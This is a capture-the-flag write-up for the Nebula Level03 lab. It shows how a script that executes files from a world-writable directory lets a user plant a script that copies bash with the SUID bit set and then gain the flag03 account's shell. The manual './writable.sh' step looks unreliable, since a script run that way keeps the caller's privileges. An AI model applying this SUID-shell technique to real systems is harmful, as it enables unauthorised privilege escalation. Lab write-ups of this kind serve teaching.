## 🧪 Nebula - Level03

> **Category:** Privilege Escalation (World-Writable Directory, Script Injection)  
> **Goal:** Execute `getflag` as user `flag03`  
> **System:** GNU/Linux – Nebula VM  
> **Required skills:** Understanding of permissions, shell scripting

---

### 🔍 Description

In this level, you have access to a world-writable directory (`writable.d`) inside the home of `flag03`, and a script (`writable.sh`) that executes every file inside that directory as `flag03`. The goal is to exploit this setup to gain `flag03` privileges and obtain the flag.

---

### 🔎 Analyzing the setup

Listing the contents of `/home/flag03`:

```
drwxrwxrwx 1 flag03 flag03      40 ... writable.d/
-rwxr-xr-x 1 flag03 flag03      98 ... writable.sh*
```

The script `writable.sh`:

```sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

This script runs every file in `writable.d` with `bash -x` as `flag03`, then deletes it.

---

### 🚀 Exploitation

1. **Create a malicious script** in `writable.d`:

   ```sh
   echo -e '#!/bin/bash\ncp /bin/bash /home/flag03/bash\nchmod u+s /home/flag03/bash' > /home/flag03/writable.d/scr.sh
   chmod +x /home/flag03/writable.d/scr.sh
   ```

2. **Run the vulnerable script**:

   ```sh
   ./writable.sh
   ```

   This will copy `/bin/bash` to `/home/flag03/bash` and set the SUID bit, making it executable as `flag03`.

3. **Get a shell as flag03**:

   ```sh
   ./bash -p
   ```

   Now you have a shell as `flag03`.

4. **Retrieve the flag**:

   ```sh
   getflag
   ```

   Output:

   ```
   You have successfully executed getflag on a target account
   ```

---

### ✅ Full solution

```sh
echo -e '#!/bin/bash\ncp /bin/bash /home/flag03/bash\nchmod u+s /home/flag03/bash' > /home/flag03/writable.d/scr.sh
chmod +x /home/flag03/writable.d/scr.sh
./writable.sh
./bash -p
getflag
```

---

### 🔐 Security lesson

This level demonstrates the danger of executing scripts from a world-writable directory, especially as a privileged user. Any user with write access can inject malicious code and escalate privileges.

---
